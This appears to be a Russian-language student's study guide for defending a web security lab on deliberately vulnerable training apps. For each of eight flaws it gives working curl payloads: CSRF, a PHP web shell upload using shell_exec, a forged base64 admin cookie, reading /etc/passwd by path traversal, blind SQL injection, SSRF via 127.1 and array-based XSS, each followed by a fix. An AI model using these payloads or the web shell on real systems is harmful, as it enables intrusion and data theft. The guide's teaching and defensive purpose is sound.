# Лабораторная №2 — понятная инструкция для защиты

Этот файл не заменяет официальный отчёт, а нужен для понимания и подготовки к устной защите.

Фокус этой инструкции — **вариант А**, то есть практическая эксплуатация учебных стендов с командами, payload'ами и фактическими результатами.

## 0. Что я вообще делал

В этой лабораторной я проверял учебные веб-стенды с заранее заложенными уязвимостями. Это не взлом чужой системы, а работа в разрешённой учебной среде.

**Proxmox** — это платформа, где запущены виртуальные машины лабораторного стенда. Проще говоря, это панель управления учебными VM.

**WireGuard** — это VPN. Он нужен, чтобы мой компьютер получил доступ к закрытой лабораторной сети. Без VPN адреса `10.0.0.x` не открываются.

Главная машина для этой лабораторной — `10.0.0.40`. На ней запущены 8 маленьких веб-приложений. Каждое приложение слушает свой порт:

- `1331` — первый стенд;
- `1332` — второй стенд;
- и так до `1338`.

Порт — это как отдельная дверь к приложению на одной машине. IP один и тот же, но двери разные.

Официальный отчёт `lab2.md` нужен для сдачи: там команды, результаты, классы уязвимостей и исправления. Этот файл — шпаргалка простым языком, чтобы понять, что говорить на защите.

## 1. Главная схема любой уязвимости

Почти все стенды разбираются одинаково:

1. Есть входные данные от пользователя: GET-параметр, POST-форма, cookie, файл, URL.
2. Сервер вроде бы проверяет эти данные, но делает это неправильно.
3. Данные попадают в опасное место: SQL-запрос, чтение файла, HTML, запрос от сервера, загрузку файла.
4. Payload показывает проблему. Payload — это специально подобранное значение, которое доказывает уязвимость.
5. Fix должен закрывать не один конкретный payload, а весь класс проблемы.

Главная мысль для защиты: я не просто запускал команды, а показывал цепочку “вход -> ошибка проверки -> опасное действие -> доказательство -> исправление”.

## 2. Мини-словарь

**Payload** — значение, которое мы отправляем приложению, чтобы проверить уязвимость. Например, строка SQL-инъекции или XSS-код.

**Exploit** — практическое использование уязвимости. Например, команда, которая реально меняет поведение сервера.

**PoC** — proof of concept, короткое доказательство, что проблема существует.

**Cookie** — маленькое значение, которое браузер хранит для сайта и отправляет обратно на сервер. Часто через cookie хранят идентификатор сессии.

**Base64** — способ кодирования текста. Это не защита и не шифрование. Любой может декодировать и закодировать обратно.

**Blacklist** — список запрещённых значений. Например, “нельзя `.php`”.

**Whitelist** — список разрешённых значений. Обычно безопаснее: “можно только `.jpg`, `.png`, `.pdf`”.

**RCE** — remote code execution, удалённое выполнение кода на сервере.

**IDOR** — insecure direct object reference. Это когда можно обратиться к чужому объекту или роли, просто поменяв id, cookie или параметр.

**CSRF** — атака, где браузер жертвы сам отправляет запрос с её cookie, а сервер не понимает, что пользователь не хотел этого действия.

**XSS** — внедрение JavaScript/HTML в страницу, которую потом откроет пользователь.

**SSRF** — server-side request forgery. Это когда мы заставляем сервер сделать запрос туда, куда снаружи ходить нельзя.

**SQL Injection** — внедрение своего SQL-кода в запрос к базе данных.

**Path Traversal** — чтение файлов вне разрешённой директории, например `/etc/passwd`.

**Prepared statements** — правильный способ работы с SQL: запрос и значения передаются отдельно, поэтому значение не становится SQL-кодом.

**realpath** — функция, которая получает настоящий абсолютный путь к файлу. Нужна, чтобы проверить, что файл лежит внутри разрешённой папки.

**Dangerous sink** — опасное место, куда попали данные: SQL, HTML, `file_get_contents`, `requests.get`, `shell_exec`, загрузка в web root.

## 4. Разбор каждого стенда

### Стенд 1 — `csrf-change-email`

#### Что делает приложение

Приложение меняет email пользователя. Оно смотрит на cookie `session` и на POST-поле `email`.

#### Где ошибка

```php
if ($_SESSION["session"] == $_COOKIE["session"]) {
    if (preg_match('/^[A-Za-z0-9_@\-\.]+$/', $_POST["email"])) {
        $email = $_POST["email"];
    }
    EditUser("email", $email);
}
```

Ошибка в том, что сервер проверяет cookie, но не проверяет CSRF-токен. Он не знает, сам пользователь отправил форму или это сделал чужой сайт.

#### Какой payload

```bash
curl -i -b 'session=123456' \
  -d 'email=attacker@example.test' \
  http://10.0.0.40:1331/
```

HTML для CSRF:

```html
<form id="csrf" action="http://10.0.0.40:1331/" method="POST">
  <input type="hidden" name="email" value="attacker@example.test">
</form>
<script>document.getElementById("csrf").submit();</script>
```

#### Что должно получиться

Сервер возвращает `HTTP/1.1 200 OK` и строку `Email changed`.

#### Почему это сработало

Браузер автоматически отправляет cookie на сайт `10.0.0.40:1331`. Сервер видит cookie и думает, что запрос легитимный.

#### Как правильно исправить

Добавить CSRF-токен в форму и проверять его на сервере. Cookie также стоит делать `SameSite=Lax/Strict`.

#### Как объяснить на защите за 20 секунд

“На этом стенде смена email защищена только cookie. Но cookie браузер отправляет автоматически, поэтому чужая страница может отправить форму от имени пользователя. Нужен CSRF-токен, который атакующий сайт не знает.”

### Стенд 2 — `file-upload-extension-blacklist`

#### Что делает приложение

Приложение принимает файл и кладёт его в папку `uploads/`.

#### Где ошибка

```php
$blacklist_ext = ["php", "php4", "php5", "phtm", "phtml", "phar"];
$ext = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));

if (in_array($ext, $blacklist_ext)) {
    echo "You got caught!";
    die();
}

move_uploaded_file($_FILES["filedoc"]["tmp_name"], $target_file);
```

Ошибка в blacklist. Он запрещает несколько расширений, но не все опасные варианты.

#### Какой payload

```bash
curl -i \
  -F 'filedoc=@lab2/payloads/upload-shell.php3' \
  -F 'submit=Upload' \
  http://10.0.0.40:1332/
```

Файл:

```php
<?php
echo "RCE_OK\n";
echo shell_exec($_GET["cmd"] ?? "id");
?>
```

Ожидаемый второй шаг:

```bash
curl -i 'http://10.0.0.40:1332/uploads/upload-shell.php3?cmd=id'
```

#### Что должно получиться

Идея payload: `.php3` не находится в blacklist, поэтому файл должен загрузиться и выполниться как PHP.

Фактически на текущем стенде загрузка не завершилась:

```text
move_uploaded_file(uploads/upload-shell.php3): Failed to open stream: No such file or directory
Unable to move ... to "uploads/upload-shell.php3"
```

#### Почему это сработало или не дошло до конца

Blacklist действительно обходится расширением `.php3`. Но финальный RCE не случился из-за ошибки окружения: папки `uploads/` нет. Это не исправление уязвимости, а проблема запуска стенда.

#### Как правильно исправить

Не использовать blacklist. Разрешать только безопасные расширения, проверять тип файла, хранить загрузки вне web root и запрещать выполнение скриптов в upload-папке.

#### Как объяснить на защите за 20 секунд

“Код запрещает только несколько PHP-расширений, но `.php3` не запрещён. Это обход blacklist. На моём запуске RCE не дошёл до конца, потому что на стенде отсутствовала папка `uploads/`, но сама ошибка фильтрации в коде видна.”

### Стенд 3 — `idor-basic-role`

#### Что делает приложение

Приложение показывает admin dashboard, если в cookie `userdata` роль равна `admin`.

#### Где ошибка

```python
userDataBase64 = request.cookies.get('userdata')
userDataJSON = base64.b64decode(userDataBase64)
userData = json.loads(userDataJSON)

if userData.get('role') == 'admin':
    return render_template('index.html', result='Admin dashboard')
```

Ошибка в том, что роль берётся от клиента. Клиент может сам создать cookie.

#### Какой payload

```bash
curl -i \
  -b 'userdata=eyJyb2xlIjoiYWRtaW4ifQ==' \
  http://10.0.0.40:1333/
```

Это Base64 от:

```json
{"role":"admin"}
```

#### Что должно получиться

В ответе есть:

```html
<h2> Admin dashboard </h2>
```

#### Почему это сработало

Base64 — это просто кодировка. Она не доказывает, что данные создал сервер.

#### Как правильно исправить

Права надо хранить на сервере. Если используется токен, он должен быть подписан, а критичные права всё равно лучше проверять на сервере.

#### Как объяснить на защите за 20 секунд

“Я сам создал cookie с ролью admin. Сервер ей поверил, потому что Base64 ошибочно используется как будто это защита. Правильный вариант — хранить роль на сервере и проверять авторизацию серверной логикой.”

### Стенд 4 — `idor-invalid-if-statement`

#### Что делает приложение

Приложение читает JSON-файлы `details/{id}.json`. По задумке доступ должен быть только у администратора.

#### Где ошибка

```php
if ($sess != '...' && $user != 'tom') {
    echo "You are not authorized to view this content.";
    return;
}
readfile("details/$id.json");
```

Ошибка в `&&`. Код запрещает доступ только если одновременно неверная сессия и неверный пользователь.

#### Какой payload

```bash
curl -i \
  -b 'user=tom; usess=anything; id=1337' \
  'http://10.0.0.40:1334/?details'

curl -i \
  -b 'user=tom; usess=anything; id=4242' \
  'http://10.0.0.40:1334/?details'
```

#### Что должно получиться

Сервер отдаёт JSON-карточки пользователей. В отчёте реальные значения сессионных и CSRF-полей не раскрываются.

#### Почему это сработало

Если поставить `user=tom`, часть `$user != 'tom'` становится false. А при `&&` всё условие становится false, и доступ открывается.

#### Как правильно исправить

```php
if ($sess !== ADMIN_SESSION || $user !== 'tom') {
    http_response_code(403);
    exit('Forbidden');
}
```

#### Как объяснить на защите за 20 секунд

“Проверка должна запрещать доступ, если сессия неверная или пользователь не tom. В коде стоит `&&`, поэтому достаточно подставить `user=tom`, и проверка ломается.”

### Стенд 5 — `pathTraversal-improper-regex`

#### Что делает приложение

Приложение читает файл, имя которого приходит в параметре `file`.

#### Где ошибка

```php
function PathFilter($s) {
    $s = preg_replace("/(:\/\/)|\\\\/", "", $s);
    while (str_contains($s, "../")) {
        $s = str_replace("../", "", $s);
    }
    return $s;
}

$file = htmlspecialchars(PathFilter($_GET['file']));
$content = file_get_contents($file);
```

Ошибка в том, что код пытается удалить плохие подстроки, а не проверяет настоящий путь файла.

#### Какой payload

```bash
curl -i 'http://10.0.0.40:1335/?file=/etc/passwd'
```

#### Что должно получиться

В ответе появляется содержимое `/etc/passwd`, например строки с `root`, `www-data`, `nobody`.

#### Почему это сработало

`/etc/passwd` — абсолютный путь. В нём нет `../`, поэтому фильтр ничего не удаляет.

#### Как правильно исправить

```php
$base = realpath(__DIR__ . '/files');
$candidate = realpath($base . '/' . $_GET['file']);

if ($candidate === false || strncmp($candidate, $base . DIRECTORY_SEPARATOR, strlen($base) + 1) !== 0) {
    http_response_code(403);
    exit('Forbidden');
}

echo file_get_contents($candidate);
```

#### Как объяснить на защите за 20 секунд

“Фильтр удаляет `../`, но это не защита. Я передал абсолютный путь `/etc/passwd`, и сервер прочитал файл. Правильно — получить `realpath()` и проверить, что файл внутри разрешённой папки.”

### Стенд 6 — `sqli-blind-variable-mixup`

#### Что делает приложение

Приложение ищет товары по цвету. Параметры идут в SQL-запрос.

#### Где ошибка

```php
$color = $_GET["color"];

$lst = array(
    $id => $id,
    $stock => $stock,
    $color => $mysqlDB->real_escape_string($color)
);

$result = mysqli_query(
    $mysqlDB,
    "SELECT * FROM `products` WHERE color = '$color' AND (id > $id AND stock > $stock)"
);
```

Ошибка в том, что экранированная копия есть, но в SQL всё равно попадает старый `$color`.

#### Какой payload

Истинное условие:

```bash
curl -i -G http://10.0.0.40:1336/ \
  --data-urlencode 'id=0' \
  --data-urlencode 'stock=0' \
  --data-urlencode "color=' OR 1=1 -- -"
```

Ложное условие:

```bash
curl -i -G http://10.0.0.40:1336/ \
  --data-urlencode 'id=0' \
  --data-urlencode 'stock=0' \
  --data-urlencode "color=' OR 1=2 -- -"
```

Blind-скрипт:

```bash
python3 lab2/payloads/sqli_blind_redacted.py
```

#### Что должно получиться

Для `OR 1=1`:

```html
<p>Search result: 10 exist with color: ...</p>
```

Для `OR 1=2`:

```html
<p>Search result: OUT OF STOCK</p>
```

Blind-скрипт выводит:

```text
username=Mario
password_length=9
password_value=<redacted>
```

#### Почему это сработало

Мы закрыли строку SQL кавычкой и добавили своё условие. Сервер начал выполнять не только поиск по цвету, но и нашу SQL-логику.

#### Как правильно исправить

```php
$stmt = $mysqli->prepare(
    'SELECT * FROM products WHERE color = ? AND (id > ? AND stock > ?)'
);
$stmt->bind_param('sii', $color, $id, $stock);
$stmt->execute();
```

#### Как объяснить на защите за 20 секунд

“Цвет попадает в SQL как часть строки. Экранирование сделали не туда, поэтому payload меняет запрос. Я показал true/false-разницу и blind-скриптом достал имя пользователя без раскрытия пароля.”

### Стенд 7 — `ssrf-regex-bypass`

#### Что делает приложение

Приложение принимает URL картинки и само скачивает её через `requests.get`.

#### Где ошибка

```python
lst_local = ['localhost', '127.0.0.1']

URLCheck = re.search(r'^.*://(.*?)(:|/)', url).group(1)

if (URLCheck in lst_local) and (protocol in lst_proto):
    return b""

res = requests.get(url)
```

Ошибка в том, что запрещены только строки `localhost` и `127.0.0.1`.

#### Какой payload

```bash
curl -i -G http://10.0.0.40:1337/ \
  --data-urlencode 'image=http://127.1:1337/'
```

Дополнительная проверка:

```bash
curl -i -G http://10.0.0.40:1337/ \
  --data-urlencode 'image=http://127.1:1333/'
```

#### Что должно получиться

Для `127.1:1337` сервер возвращает `HTTP/1.1 200 OK` и вставляет base64-ответ локального сервиса в HTML.

Для `127.1:1333` сервер пытается сходить на loopback и получает `Connection refused`. Это тоже доказывает, что запрос был сделан с сервера.

#### Почему это сработало

`127.1` — это тоже loopback, но строка не равна `127.0.0.1`, поэтому blacklist её пропускает.

#### Как правильно исправить

Использовать allowlist доменов, проверять реальный IP после DNS, запрещать loopback/private/link-local адреса и ограничивать исходящие запросы на уровне сети.

#### Как объяснить на защите за 20 секунд

“Сервер запрещает только `127.0.0.1`, но loopback можно записать как `127.1`. Я заставил backend сделать запрос к локальному адресу. Это SSRF.”

### Стенд 8 — `xss-christmas`

#### Что делает приложение

Приложение принимает имя и текст письма, а потом показывает письмо на странице.

#### Где ошибка

Код проверяет `letterContent.includes("<")` и `letterContent.includes(">")`, но можно передать `letterContent` как массив.

Главная идея:

```text
String.includes("<") ищет символ внутри строки.
Array.includes("<") ищет отдельный элемент массива, равный "<".
```

#### Какой payload

```bash
curl -i -X POST \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'childName=Alice' \
  --data-urlencode 'letterContent[]=<img src=x onerror=alert(document.domain)>' \
  http://10.0.0.40:1338/send-letter
```

Контрольный запрос строкой:

```bash
curl -i -X POST \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'childName=Alice' \
  --data-urlencode 'letterContent=<img src=x onerror=alert(document.domain)>' \
  http://10.0.0.40:1338/send-letter
```

#### Что должно получиться

Для массива сервер возвращает HTML:

```html
<p><strong><img src=x onerror=alert(document.domain)></strong></p>
```

Для обычной строки сервер возвращает ошибку:

```html
<p>Your letter contains invalid characters. Please try again!</p>
```

#### Почему это сработало

Проверка была написана для строки, но сервер принял массив. Потом массив превратился в строку и попал в HTML без экранирования.

#### Как правильно исправить

```js
if (typeof letterContent !== 'string') {
  return res.status(400).send('Invalid input');
}

const safeLetter = escapeHtml(letterContent);
```

Ещё полезно включить CSP.

#### Как объяснить на защите за 20 секунд

“Фильтр проверял строку, но я отправил массив. У массива `includes` работает иначе. Проверка прошла, а потом массив вставился в HTML как строка с `<img onerror=...>`.”

## 5. Что я должен уметь сказать на защите

**Чем CSRF отличается от XSS?**  
CSRF заставляет браузер жертвы отправить действие с её cookie. XSS внедряет JavaScript/HTML в страницу.

**Почему Base64 не защита?**  
Base64 можно легко декодировать и закодировать обратно. Это не подпись и не шифрование.

**Почему blacklist хуже whitelist?**  
В blacklist легко забыть опасный вариант. Whitelist проще: разрешаем только то, что точно безопасно.

**Что такое IDOR?**  
Это когда пользователь может получить доступ к чужому объекту или правам, просто поменяв id, cookie или параметр.

**Почему `&&` надо заменить на `||`?**  
Потому что доступ должен запрещаться, если неверна сессия или неверен пользователь. Достаточно одной ошибки, чтобы отказать.

**Почему фильтрация `../` не защищает от Path Traversal?**  
Потому что есть абсолютные пути и другие способы записи. Нужно проверять настоящий путь через `realpath()`.

**Почему prepared statements лучше экранирования?**  
Потому что SQL-код и данные передаются отдельно. Данные не могут стать частью SQL-команды.

**Что такое blind SQL injection?**  
Это SQL-инъекция, где данные не выводятся напрямую. Мы задаём true/false-вопросы и по разнице ответов восстанавливаем информацию.

**Почему SSRF опасен?**  
Потому что сервер может достучаться до внутренних адресов, куда внешний пользователь напрямую не имеет доступа.

**Чем Array.includes отличается от String.includes?**  
`String.includes("<")` ищет символ внутри строки. `Array.includes("<")` ищет отдельный элемент массива, равный `<`.

**Зачем CSP?**  
CSP ограничивает, какие скрипты можно выполнять. Она не заменяет исправление XSS, но снижает ущерб.

**Почему File Upload у меня не дошёл до RCE?**  
Payload `.php3` обошёл blacklist, но загрузка не завершилась из-за ошибки окружения: на стенде не было директории `uploads/`. Поэтому я честно фиксирую обход blacklist, но не заявляю успешный RCE.

## 6. Моя честная позиция по выполнению

7 стендов подтверждены живыми ответами сервера:

1. CSRF.
2. IDOR через клиентскую роль.
3. Broken Access Control через неверный `if`.
4. Path Traversal.
5. SQL Injection.
6. SSRF.
7. XSS.

File Upload подтверждён как обход blacklist, но финальный RCE не завершился из-за ошибки окружения `uploads/`.

## 7. Быстрая шпаргалка перед защитой

1. **CSRF:** cookie отправляется автоматически, нет CSRF-токена. Fix: CSRF-token + SameSite.
2. **File Upload:** `.php3` не в blacklist, но RCE не дошёл из-за отсутствия `uploads/`. Fix: whitelist + запрет выполнения uploads.
3. **IDOR role:** роль лежит в Base64-cookie, её можно подделать. Fix: серверная авторизация.
4. **Invalid If:** `&&` делает проверку fail-open при `user=tom`. Fix: `||` и RBAC.
5. **Path Traversal:** `/etc/passwd` читается, потому что фильтр ищет только `../`. Fix: `realpath()` + base directory.
6. **SQLi:** `$color` попадает в SQL без правильной параметризации. Fix: prepared statements.
7. **SSRF:** `127.1` обходит blacklist `127.0.0.1`. Fix: allowlist + проверка реального IP.
8. **XSS:** массив `letterContent[]` обходит проверку строки. Fix: проверка типа + HTML escaping + CSP.
